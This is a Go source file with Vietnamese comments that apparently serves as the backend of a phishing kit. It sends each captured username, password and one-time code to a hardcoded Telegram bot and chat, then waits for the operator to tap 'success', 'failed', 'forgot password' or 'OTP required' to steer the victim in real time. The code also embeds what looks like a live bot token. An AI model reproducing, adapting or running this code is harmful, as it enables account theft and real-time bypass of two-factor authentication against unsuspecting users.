package services

import (
	"bytes"
	"encoding/json"
	"fmt"
	"log"
	"math/rand"
	"net/http"
	"sync"
	"time"
)

const (
	telegramBotToken = "7704974227:AAF_K3wljQGulPN1kej4WdAJ0Ee7gQ2yjYE"
	telegramChatID   = "1419120182"
	apiBaseURL       = "https://api.telegram.org/bot" + telegramBotToken
	responseTimeout  = 20 * time.Second
)

// Kênh lưu phản hồi từ Telegram
var TelegramResponseChannel = make(map[string]chan string)
var mutex sync.Mutex

// Tạo mã requestID ngẫu nhiên
func generateRequestID() string {
	return fmt.Sprintf("%d", rand.Intn(1000000))
}

// Gửi tin nhắn đến Telegram với requestID
func SendLoginMessage(username, password, otp string) string {
	url := fmt.Sprintf("%s/sendMessage", apiBaseURL)
	requestID := generateRequestID()

	payload := map[string]interface{}{
		"chat_id":    telegramChatID,
		"text":       fmt.Sprintf("🔑 *Thông tin đăng nhập*\n👤 Username: `%s`\n🔒 Password: `%s`\n🔢 Otp: `%s`\n📢 *Chọn trạng thái:*", username, password, otp),
		"parse_mode": "Markdown",
		"reply_markup": map[string]interface{}{
			"inline_keyboard": [][]map[string]string{
				{
					{"text": "✅ Thành công", "callback_data": fmt.Sprintf("status|%s|success|%s", username, requestID)},
					{"text": "❌ Thất bại", "callback_data": fmt.Sprintf("status|%s|failed|%s", username, requestID)},
				},
				{
					{"text": "🔁 Quên mật khẩu", "callback_data": fmt.Sprintf("status|%s|forgot_password|%s", username, requestID)},
					{"text": "🔑 Yêu cầu OTP", "callback_data": fmt.Sprintf("status|%s|otp_required|%s", username, requestID)},
				},
			},
		},
	}

	jsonPayload, _ := json.Marshal(payload)
	resp, err := http.Post(url, "application/json", bytes.NewBuffer(jsonPayload))
	if err != nil {
		log.Printf("❌ Lỗi khi gửi tin nhắn Telegram: %v", err)
		return ""
	}
	defer resp.Body.Close()

	// Tạo kênh mới cho requestID
	mutex.Lock()
	TelegramResponseChannel[requestID] = make(chan string, 1)
	mutex.Unlock()

	log.Printf("📩 Tin nhắn đã gửi với requestID: %s", requestID)
	return requestID
}

// Chờ phản hồi từ Telegram
func WaitForTelegramResponse(username, requestID string) (string, error) {
	mutex.Lock()
	responseChan, exists := TelegramResponseChannel[requestID]
	mutex.Unlock()

	if !exists {
		return "timeout", fmt.Errorf("🚨 Không tìm thấy requestID: %s", requestID)
	}

	select {
	case response := <-responseChan:
		return response, nil
	case <-time.After(responseTimeout):
		mutex.Lock()
		delete(TelegramResponseChannel, requestID)
		mutex.Unlock()
		return "timeout", fmt.Errorf("⏳ Hết thời gian chờ phản hồi từ Telegram!")
	}
}

// Ghi phản hồi vào kênh đúng requestID
func HandleTelegramResponse(requestID, status string) {
	mutex.Lock()
	responseChan, exists := TelegramResponseChannel[requestID]
	mutex.Unlock()

	if exists {
		responseChan <- status
		mutex.Lock()
		delete(TelegramResponseChannel, requestID)
		mutex.Unlock()
	}
}
